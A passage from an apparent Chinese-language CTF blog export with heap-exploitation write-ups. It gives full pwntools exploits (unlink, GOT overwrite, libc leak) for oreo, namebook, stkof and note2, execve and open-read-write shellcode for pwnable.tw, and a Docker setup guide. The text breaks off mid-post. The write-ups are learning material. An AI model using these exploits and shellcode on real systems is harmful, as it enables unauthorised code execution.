&apos;debug&apos;context.binary = &quot;./oreo&quot;oreo = ELF(&quot;./oreo&quot;)if args[&apos;REMOTE&apos;]: p = remote(ip, port)else: p = process(&quot;./oreo&quot;)log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))libc = ELF(&apos;./libc.so.6&apos;)def add(descrip, name): p.sendline(&apos;1&apos;) #p.recvuntil(&apos;Rifle name: &apos;) p.sendline(name) #p.recvuntil(&apos;Rifle description: &apos;) #sleep(0.5) p.sendline(descrip)def show_rifle(): p.sendline(&apos;2&apos;) p.recvuntil(&apos;===================================\\n&apos;)def order(): p.sendline(&apos;3&apos;)def message(notice): p.sendline(&apos;4&apos;) #p.recvuntil(&quot;Enter any notice you&apos;d like to submit with your order: &quot;) p.sendline(notice)def exp(): print &apos;step 1. leak libc base&apos; name = 27 * &apos;a&apos; + p32(oreo.got[&apos;puts&apos;]) add(25 * &apos;a&apos;, name) show_rifle() p.recvuntil(&apos;===================================\\n&apos;) p.recvuntil(&apos;Description: &apos;) puts_addr = u32(p.recvuntil(&apos;\\n&apos;, drop=True)[:4]) log.success(&apos;puts addr: &apos; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&apos;puts&apos;] system_addr = libc_base + libc.symbols[&apos;system&apos;] binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;)) print &quot;binsh_addr: &quot; + hex(binsh_addr) print &apos;step 2. free fake chunk at 0x0804A2A8&apos; # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle &lt; 0x3f: # set next link=NULL add(25 * &apos;a&apos;, &apos;a&apos; * 27 + p32(0)) oifle += 1 payload = &apos;a&apos; * 27 + p32(0x0804a2a8) # set next link=0x0804A2A8, try to free a fake chunk add(25 * &apos;a&apos;, payload) # before free, we need to bypass some check # fake chunk&apos;s size is 0x40 # 0x20 *&apos;a&apos; for padding the last fake chunk # 0x40 for fake chunk&apos;s next chunk&apos;s prev_size # 0x100 for fake chunk&apos;s next chunk&apos;s size # set fake iofle&apos; next to be NULL payload = 0x20 * &apos;\\x00&apos; + p32(0x40) + p32(0x100) payload = payload.ljust(52, &apos;b&apos;) payload += p32(0) payload = payload.ljust(128, &apos;c&apos;) message(payload) # fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL order() p.recvuntil(&apos;Okay order submitted!\\n&apos;) print &apos;step 3. get shell&apos; # modify strlen@got to system addr // don&apos;t know why modified free@got addr could&apos;t get shell payload = p32(oreo.got[&apos;strlen&apos;]).ljust(20, &apos;a&apos;) add(payload, &apos;b&apos; * 20) log.success(&apos;system addr: &apos; + hex(system_addr)) #gdb.attach(p) message(p32(system_addr) + &apos;;/bin/sh\\x00&apos;) p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.4-unlink","slug":"introduction-to-pwn2-4-unlink","date":"2018-12-20T02:34:50.000Z","updated":"2019-03-06T08:21:59.537Z","comments":true,"path":"2018/12/20/introduction-to-pwn2-4-unlink/","link":"","permalink":"http://siriuswhiter.tk/2018/12/20/introduction-to-pwn2-4-unlink/","excerpt":"","text":"之前看了好久的unlink，现在回来再看一下，顺便写个笔记 unlink 原理 当创建几个满足smallbin大小的块时，如果有可能使数据溢出，那么在中间的一个chunk中可以伪造一个fakechunk，同时溢出至下一个chunk的头部，伪造pre_size为fakechunk的size，修改size处的标志位，使之认为前一个chunk为空。 那么在free nextchunk(chunk2)时，因为unlink的机制，会先检查前一块chunk1是否为空，如果通过检验，那么便会将其卸下，之后再检查nextnextchunk(chunk3)，发现正在使用，则执行unlink 12345 FD=P-&gt;fdBK=P-&gt;bk FD-&gt;bk = BKBK-&gt;fd = FD 这样的操作在正常情况下会将空闲chunk卸下，但是在这样的伪造情况下，chunk1中的fakechunk便会进入chunklist。而在前面绕过unlink检查时，我们修改了fd与bk指针，使得P-&gt;FD-&gt;BK = P, P-&gt;BK-&gt;FD = P；为了能够得到对指针的控制，我们倾向于将其指向chunk1的指针所放置的内存之上，之后再修改chunk1的内容，实质上便是在修改自己的指针放置的位置及之后的指针，从而修改got表或者malloc_hook或free_hook之类的达到get_shell的目的。 使用heap-exploitation的例子来见证一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct chunk_structure &#123; size_t prev_size; size_t size; struct chunk_structure *fd; struct chunk_structure *bk; char buf[10]; // padding&#125;;unsigned long long *chunk1, *chunk2;struct chunk_structure *fake_chunk, *chunk2_hdr;char data[20];// First grab two chunks (non fast)chunk1 = malloc(0x80); // Points to 0xa0e010chunk2 = malloc(0x80); // Points to 0xa0e0a0// Assuming attacker has control over chunk1&apos;s contents// Overflow the heap, override chunk2&apos;s header// First forge a fake chunk starting at chunk1// Need to setup fd and bk pointers to pass the unlink security checkfake_chunk = (struct chunk_structure *)chunk1;fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == Pfake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P// Next modify the header of chunk2 to pass all security checkschunk2_hdr = (struct chunk_structure *)(chunk2 - 2);chunk2_hdr-&gt;prev_size = 0x80; // chunk1&apos;s data region sizechunk2_hdr-&gt;size &amp;= ~1; // Unsetting prev_in_use bit// Now, when chunk2 is freed, attacker&apos;s fake chunk is &apos;unlinked&apos;// This results in chunk1 pointer pointing to chunk1 - 3// i.e. chunk1[3] now contains chunk1 itself.// We then make chunk1 point to some victim&apos;s datafree(chunk2);chunk1[3] = (unsigned long long)data;strcpy(data, &quot;Victim&apos;s data&quot;);// Overwrite victim&apos;s data using chunk1chunk1[0] = 0x002164656b636168LL; // hex for &quot;hacked!&quot;printf(&quot;%s\\n&quot;, data); // Prints &quot;hacked!&quot; namebookh4lo大佬给的练习题，虽然相比后两个时间迟不久，但是因为比较简单，所以把插在前面 题目依旧是练习题。 四个功能： add delete reset show add 大小限制十个 ， 固定malloc(0x10).delete free完清空指针reset 大小变为0x100 明显溢出show 根据指针显示内容 保护： 1234567$ checksec namebook[*] &apos;/home/sirius/tikool/prac/namebook/namebook&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 思路先通过unlink 控制bss段存储指针的部分，然后泄露libc地址有了libc地址之后复写malloc_hook 或free_hook 为one_gadget 就好 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./namebook&apos;)elf = ELF(&apos;./namebook&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)def allocate(idx,name): sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx)) sh.sendlineafter(&apos;name:&apos;,name)def delete(idx): sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx))def show(idx): sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx))def reset(idx,name): sh.sendlineafter(&apos;&gt;&apos;,&apos;4&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx)) sh.sendlineafter(&apos;name:&apos;,name)allocate(0,&apos;a&apos;)allocate(1,&apos;b&apos;)allocate(2,&apos;c&apos;)allocate(3,&apos;d&apos;)ptr_addr = 0x602040#delete(1)reset(0,p64(0x90)+p64(0x80)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+&apos;a&apos;*0x60+p64(0x80)+p64(0x90))delete(1)#gdb.attach(sh)reset(0,&apos;a&apos;*0x18+p64(elf.got[&apos;puts&apos;])+p64(0x602040))show(0)puts_addr = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))print &apos;puts_addr: &apos;+hex(puts_addr)libc_base = puts_addr - libc.symbols[&apos;puts&apos;] print &apos;libc_base: &apos;+hex(libc_base)malloc_hook = libc_base + 0x3c4b10print &apos;malloc_hook: &apos;+hex(malloc_hook)free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]print &apos;free_hook: &apos;+hex(free_hook)one_gadget = libc_base + 0x4526a#gdb.attach(sh)reset(1,p64(free_hook))reset(0,p64(one_gadget))delete(2)#gdb.attach(sh)sh.interactive() getshell结果: 1234[*] Switching to interactive mode$ lscore namebook namebookwp.py$ stkof条件选项1：malloc_chunk 1234567891011121314151617signed __int64 malloc_chunk()&#123; __int64 size; // [rsp+0h] [rbp-80h] char *v2; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); v2 = (char *)malloc(size); if ( !v2 ) return 0xFFFFFFFFLL; ::s[++index] = v2; // ::全局 printf(&quot;%d\\n&quot;, (unsigned int)index, size); return 0LL;&#125; 选项二：edit_chunk //完全没考虑之前malloc时的大小，直接溢出就对了 12345678910111213141516171819202122232425262728293031signed __int64 edit_chunk()&#123; signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) &#123; ptr += i; size -= i; &#125; if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125; 选项三：free_chunk 1234567891011121314151617signed __int64 free_chunk()&#123; unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; // free and make it be 0 return 0LL;&#125; 分析基本上没什么分析的。。。漏洞很明显，就是在告诉你来unlink。 思路就是malloc几个smallbin大小的chunk，之后伪造fakechunk unlink，之后edit被伪造的fakechunk的chunk，修改free，atoi的got表，调用system(“/bin/sh”)获得shell1.利用unlink修改修改GOT表。2.泄露libc基址。3.将free_got改成system_addr.4.free一个内存块，其中的内容是”/bin/sh”。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129from pwn import *context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]if args[&apos;DEBUG&apos;]: context.log_level = &apos;debug&apos;context.binary = &quot;./stkof&quot;stkof = ELF(&apos;./stkof&apos;)if args[&apos;REMOTE&apos;]: p = remote(&apos;127.0.0.1&apos;, 7777)else: p = process(&quot;./stkof&quot;)log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))libc = ELF(&apos;./libc.so.6&apos;)head = 0x602140 //ida可以直接看，全局分配在了bss段def alloc(size): p.sendline(&apos;1&apos;) p.sendline(str(size)) p.recvuntil(&apos;OK\\n&apos;)def edit(idx, size, content): p.sendline(&apos;2&apos;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&apos;OK\\n&apos;)def free(idx): p.sendline(&apos;3&apos;) p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who&apos;s size is 0x20pwndbg&gt; x/6gx 0x6021400x602140: 0x0000000000000000 0x000000000244d0200x602150: 0x000000000244d540 0x000000000244d5800x602160: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/100gx 0x000000000244d5300x244d530: 0x0000000000000000 0x00000000000000410x244d540: 0x0000000000000000 0x00000000000000000x244d550: 0x0000000000000000 0x00000000000000000x244d560: 0x0000000000000000 0x00000000000000000x244d570: 0x0000000000000000 0x00000000000000910x244d580: 0x0000000000000000 0x00000000000000000x244d590: 0x0000000000000000 0x00000000000000000x244d5a0: 0x0000000000000000 0x00000000000000000x244d5b0: 0x0000000000000000 0x00000000000000000x244d5c0: 0x0000000000000000 0x00000000000000000x244d5d0: 0x0000000000000000 0x00000000000000000x244d5e0: 0x0000000000000000 0x00000000000000000x244d5f0: 0x0000000000000000 0x00000000000000000x244d600: 0x0000000000000000 0x0000000000020a010x244d610: 0x0000000000000000 0x0000000000000000 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&apos;s prev_size bypass the check payload = payload.ljust(0x30, &apos;a&apos;) # overwrite global[3]&apos;s chunk&apos;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil(&apos;OK\\n&apos;) gdb.attach(p)pwndbg&gt; x/6gx 0x6021400x602140: 0x0000000000000000 0x000000000244d0200x602150: 0x0000000000602138 0x00000000000000000x602160: 0x0000000000000000 0x0000000000000000 # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &apos;a&apos; * 8 + p64(stkof.got[&apos;free&apos;]) + p64(stkof.got[&apos;puts&apos;]) + p64( stkof.got[&apos;atoi&apos;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt[&apos;puts&apos;]) edit(0, len(payload), payload) gdb.attach(p)pwndbg&gt; x/6gx 0x6021300x602130: 0x0000000000000000 0x61616161616161610x602140: 0x0000000000602018 //free 0x0000000000602020 //puts0x602150: 0x0000000000602088 //atoi 0x0000000000000000 #free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&apos;\\nOK\\n&apos;, drop=True).ljust(8, &apos;\\x00&apos;) puts_addr = u64(puts_addr) log.success(&apos;puts addr: &apos; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&apos;puts&apos;] binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;)) system_addr = libc_base + libc.symbols[&apos;system&apos;] log.success(&apos;libc base: &apos; + hex(libc_base)) log.success(&apos;/bin/sh addr: &apos; + hex(binsh_addr)) log.success(&apos;system addr: &apos; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp() zctf-note2其实和stkof差不太多 条件 创建 //最多只能有三个note，同时note大小最大128 123456789101112131415161718192021int NewNote()&#123; char *note; // ST08_8 unsigned int v2; // eax unsigned int size; // [rsp+4h] [rbp-Ch] if ( (unsigned int)NoteNum &gt; 3 ) return puts(&quot;note lists are full&quot;); puts(&quot;Input the length of the note content:(less than 128)&quot;); size = inputNum(); if ( size &gt; 0x80 ) return puts(&quot;Too long&quot;); note = (char *)malloc(size); puts(&quot;Input the note content:&quot;); ReadStr(note, size, 10); RemovePercent(note); ptr[NoteNum] = (__int64)note; Len[NoteNum] = size; v2 = NoteNum++; return printf(&quot;note add success, the id is %d\\n&quot;, v2);&#125; 修改 //两种方式，overwrite与append 123456789101112131415161718192021puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;); v4 = inputNum(); if ( v4 == 1 || v4 == 2 ) &#123; if ( v4 == 1 ) dest = 0; else strcpy(&amp;dest, src); v0 = (char *)malloc(0xA0uLL); v8 = v0; *(_QWORD *)v0 = &apos;oCweNehT&apos;; *((_QWORD *)v0 + 1) = &apos;:stnetn&apos;; printf(v8); ReadStr(v8 + 15, 0x90LL, 10); RemovePercent(v8 + 15); v1 = v8; v1[v6 - strlen(&amp;dest) + 14] = 0; strncat(&amp;dest, v8 + 15, 0xFFFFFFFFFFFFFFFFLL); strcpy(src, &amp;dest); free(v8); puts(&quot;Edit note success!&quot;); 还有show的功能和delete的功能，这里就不展示了 分析相比于stkof显而易见的漏洞，这个因为edit的操作较为复杂，漏洞没有那么容易出来，但是如果出来便可以直接利用。在malloc时，可以输入size为0，这样将自动分配最小单位即0x20大小的chunk，但是在readstr时允许输入size-1大小的数，也就是0xffffffff，这样便足以溢出去修改。free之后再申请同样大小的chunk，便会将其列入第四个chunk但是位置仍然在之前chunk1的位置，通过之前size的漏洞修改chunk3的pre_size及size得到unlink的条件。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *sh = process(&apos;./note2&apos;)note2 = ELF(&apos;./note2&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)context.log_level = &apos;debug&apos;def newnote(length, content): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;(less than 128)&apos;) sh.sendline(str(length)) sh.recvuntil(&apos;content:&apos;) sh.sendline(content)def shownote(id): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id))def editnote(id, choice, s): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id)) sh.recvuntil(&apos;2.append]&apos;) sh.sendline(str(choice)) sh.sendline(s)def deletenote(id): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id))sh.recvuntil(&apos;name:&apos;)sh.sendline(&apos;siriuswhiter&apos;)sh.recvuntil(&apos;address:&apos;)sh.sendline(&apos;aaaaaaaaaaaaaaaaa&apos;)# chunk0: a fake chunkptr = 0x0000000000602120fakefd = ptr - 0x18fakebk = ptr - 0x10content = &apos;a&apos; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &apos;b&apos; * 64 + p64(0x60)#content = p64(fakefd) + p64(fakebk)newnote(128, content)# chunk1: a zero size chunk produce overwritenewnote(0, &apos;a&apos; * 8)# chunk2: a chunk to be overwrited and freednewnote(0x80, &apos;b&apos; * 16)gdb.attach(sh)# edit the chunk1 to overwrite the chunk2deletenote(1)content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)newnote(0, content)#gdb.attach(sh)# delete note 2 to trigger the unlink# after unlink, ptr[0] = ptr - 0x18deletenote(2)gdb.attach(sh)# overwrite the chunk0(which is ptr[0]) with got atoiatoi_got = note2.got[&apos;atoi&apos;]content = &apos;a&apos; * 0x18 + p64(atoi_got)editnote(0, 1, content)# get the aoti addrshownote(0)sh.recvuntil(&apos;is &apos;)atoi_addr = sh.recvuntil(&apos;\\n&apos;, drop=True)print atoi_addratoi_addr = u64(atoi_addr.ljust(8, &apos;\\x00&apos;))print &apos;leak atoi addr: &apos; + hex(atoi_addr)# get system addratoi_offest = libc.symbols[&apos;atoi&apos;]libcbase = atoi_addr - atoi_offestsystem_offest = libc.symbols[&apos;system&apos;]system_addr = libcbase + system_offestprint &apos;leak system addr: &apos;, hex(system_addr)# overwrite the atoi got with systemaddrcontent = p64(system_addr)editnote(0, 1, content)gdb.attach(sh)# get shellsh.recvuntil(&apos;option---&gt;&gt;&apos;)sh.sendline(&apos;/bin/sh&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Learning Docker","slug":"learning-docker","date":"2018-11-10T03:27:22.000Z","updated":"2018-11-10T08:34:21.443Z","comments":true,"path":"2018/11/10/learning-docker/","link":"","permalink":"http://siriuswhiter.tk/2018/11/10/learning-docker/","excerpt":"","text":"之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧 pwn环境部署 最基础的方法是socat， socat tcp-l:9999,fork exec:./pwn1 没有timeout，连得人多多半就爆炸了 所以选择：xinted + docker xintedxinted从权限到服务配置都做好了一个dockerfile,build即可 1git clone https://github.com/Eadom/ctf_xinetd.git docker 安装 因为没有用ubuntu，kali等其他的debian系等等没法直接 sudo apt-get install docker-ce kali最后成功安装docker的方法： 在/etc/apt/sources.list 中添加 1deb http://http.debian.net/debian jessie-backports main 更新源并安装即可 12apt-get update apt-get install docker.io 配置docker环境 将bin文件放置到bin目录下 修改flag内容 修改ctf.xinted的服务：port = 指定端口server_args = –userspec=1000:1000 /home/ctf ./binname build dockerfile12docker build -t &quot;binname&quot; . docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname 将镜像跑起来就ok了 pwn docker一个集成pwn常用工具的docker，暂时用的是pwndocker,不过比较臃肿，之后再自己搭建一个 使用一般刚开机docker未打开，使用service docker start打开服务 pull 1docker pull skysider/pwndocker docker images 可以看到已经在仓库里了 123/pwn/docker# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 各项含义： REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 docker run -t -i skysider/pwndocker直接进入bash 12~/pwn/docker# docker run -t -i skysider/pwndockerroot@b11ff1440061:/ctf/work# *b11ff1440061 是container的id* 外部文件要往container里复制，使用 1docker cp /path/file b11ff1440061: /path 当然b11ff1440061 换成container的id 因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装 有两种办法： 在container中安装完以后，exit 1docker commit b11ff1440061 pwndocker 同时可以使用 -m 来指定提交的说明信息，跟我们使用的版本控制一样-a 可以指定更新的用户信息之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息 这样可以将修改完的另存为新的image 1234~# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpwndocker latest 7c0fa09ee004 12 seconds ago 2.05GBskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 使用dockerfile重新build 像这里可以举例，编辑dockerfile： 123FROM skysider/pwndockerRUN apt-get install vim From 指定镜像源RUN 指令告诉docker 在镜像内执行命令，安装了什么。。EXPOSE 可以指定开放端口 编辑完后1docker build -t pwndocker . 按理说这样子就可以了。。但是我这里会有个报错The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1仍未解决","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"},{"name":"docker","slug":"docker","permalink":"http://siriuswhiter.tk/tags/docker/"}]},{"title":"pwnable.tw-wp","slug":"pwnable-tw-wp","date":"2018-11-06T11:37:08.000Z","updated":"2018-12-29T01:13:55.114Z","comments":true,"path":"2018/11/06/pwnable-tw-wp/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/","excerpt":"","text":"好久没碰pwn了，找找感觉pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题 start见到的最轻巧的一个题 题目12345678910111213141516171819202122232425262728293031func main()push esp; 4: result = 3;push offset _exitxor eax, eax; 5: __asmxor ebx, ebxxor ecx, ecxxor edx, edxpush &apos;:FTC&apos;push &apos; eht&apos;push &apos; tra&apos;push &apos;ts s&apos;push 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 60mov al, 3int 80h ; LINUX -add esp, 14hretnfunc exit()pop espxor eax, eaxinc eaxint 80h 以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出 分析大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。 exp1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./start&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10000)shellcode =&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot; print len(shellcode)pay = &apos;a&apos;*20 + p32(0x8048087) sh.recv()sh.send(pay)leak_addr = u32(sh.recv(4))print hex(leak_addr)esp_addr = leak_addr + 0x14pay = &apos;a&apos;*20 + p32(esp_addr) + shellcodesh.send(pay) #gdb.attach(sh)sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10000: Done210xff936bc0[*] Switching to interactive mode\\x00\\x00\\x005o\\x93\\xff\\x00\\x00\\x00\\x00Go\\x93\\xff$ whoamistart$ orw贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write 题目123456789101112131415161718192021222324252627282930313233343536373839main:int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125;orw_seccomp():unsigned int orw_seccomp()&#123; __int16 v1; // [esp+4h] [ebp-84h] char *v2; // [esp+8h] [ebp-80h] char v3; // [esp+Ch] [ebp-7Ch] unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u); v1 = 12; v2 = &amp;v3; prctl(38, 1, 0, 0, 0); // 38 PR_SET_NO_NEW_PRIVS // 将调用线程的no_new_privs位设置为值 // ARG2。将no_new_privs设置为1，execve（2）承诺不会 // 授予执行任何无法完成的任务的权限 // 没有execve（2）调用（例如，渲染集合 - // user-ID和set-group-ID模式位，以及非文件功能 // 功能性的）。设置后，该位不能取消设置。那个设定 // 这个位是由fork（2）和 // 克隆（2），并保存在execve（2）。 // prctl(22, 2, &amp;v1); // 22 PR_SET_SECCOMP // seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall, 这是不安全的, // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了. // 大概是终结了系统调用的可能,也就很难getshell了。 return __readgsdword(0x14u) ^ v4;&#125; 分析题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。 这块可以参考https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.hhttp://man7.org/linux/man-pages/man2/prctl.2.html 因为看不了题，不过在源码里能看到 12345 &lt;!-- description --&gt; &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt; 这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛 \"系统调用\" exp简直就是汇编实习现场了 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#sh = process(&apos;./orw&apos;)sh = remote(&quot;chall.pwnable.tw&quot;,10001)shellcode=&apos;&apos;&apos;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;mov ebx,esp;xor ecx,ecx;xor edx,edx;xor eax,eax;mov al,0x5;int 0x80; //openmov ebx,eax;xor eax,eax;mov al,0x3;mov ecx,esp;mov dl,0x30;int 0x80; //readmov al,0x4;mov bl,1;mov dl,0x30;int 0x80; //write&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))sh.sendline(asm(shellcode))sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10001: Done[*] Switching to interactive modeGive my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;�u�\\x0[*] Got EOF while reading in interactive$ calc前面还一对代码说题目干净，这个题就开始一堆代码了。。。 题目123456789101112131415161718192021222324252627282930313233343536373839unsigned int calc()&#123; int v1; // [esp+18h] [ebp-5A0h] int v2[100]; // [esp+1Ch] [ebp-59Ch] char s; // [esp+1ACh] [ebp-40Ch] unsigned int v4; // [esp+5ACh] [ebp-Ch] v4 = __readgsdword(0x14u); while ( 1 ) &#123; bzero(&amp;s, 0x400u); // 置字节字符串前n个字节为零且包括‘\\0’。 if ( !get_expr((int)&amp;s, 1024) ) break; init_pool(&amp;v1); //初始化v1 if ( 